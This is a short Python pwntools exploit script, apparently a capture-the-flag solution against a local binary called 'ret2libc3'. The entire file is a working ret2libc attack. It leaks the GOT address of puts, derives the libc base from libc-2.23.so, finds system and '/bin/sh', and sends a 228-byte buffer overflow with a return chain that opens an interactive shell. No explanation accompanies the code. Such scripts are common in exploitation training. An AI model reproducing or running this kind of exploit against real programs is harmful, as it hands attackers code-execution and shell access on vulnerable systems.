from pwn import *
p=process('./ret2libc3')
context(arch='i386',os='linux',log_level='debug')
elf=ELF('./ret2libc3')
libc=ELF('./libc-2.23.so')

p.sendlineafter("(in dec) :",str(elf.got['puts']))
puts_addr=p.recvuntil('\n',drop = True)[-10:]
log.info(elf.got['puts'])
log.info(puts_addr)
libc_base=int(puts_addr,16)-libc.symbols['puts']
sys_addr=libc_base+libc.symbols['system']
sh_addr=libc_base+next(libc.search(b'/bin/sh'))
ret_addr=next(elf.search(asm('ret')))
log.info(ret_addr)

payload=flat([cyclic(228),sys_addr,0,sh_addr])

p.sendlineafter("Leave some message for me :",payload)
p.interactive()
